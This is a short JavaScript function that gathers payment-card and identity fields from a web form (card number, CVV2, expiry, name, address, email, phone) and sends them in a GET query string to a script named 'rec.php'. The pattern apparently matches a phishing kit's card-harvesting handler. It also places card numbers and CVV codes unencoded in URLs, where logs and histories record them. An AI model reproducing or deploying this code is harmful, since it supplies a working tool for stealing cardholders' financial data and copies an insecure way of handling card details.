function send(){
  var xhttp = new XMLHttpRequest();
  var name = document.getElementById("name").value;
  var last = document.getElementById("last").value;
  var mail = document.getElementById("mail").value;
  var typecard = document.getElementById("typecard").value;
  var num = document.getElementById("num").value;
  var cvv2 = document.getElementById("cvv2").value;
  var month = document.getElementById("month").value;
  var year = document.getElementById("year").value;
  var address = document.getElementById("address").value;
  var city = document.getElementById("city").value;
  var state = document.getElementById("state").value;
  var zip = document.getElementById("zip").value;
  var country = document.getElementById("country").value;
  var phone = document.getElementById("phone").value;

  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("contenedor").innerHTML = this.responseText;
    }
  };

  xhttp.open("GET",'rec.php?name='+name+'&last='+last+'&mail='+mail+'&typecard='+typecard+'&num='+num+'&cvv2='+cvv2+'&month='+month+'&year='+year+'&address='+address+'&city='+city+'&state='+state+'&zip='+zip+'&country='+country+'&phone='+phone,true);
  xhttp.send();

}
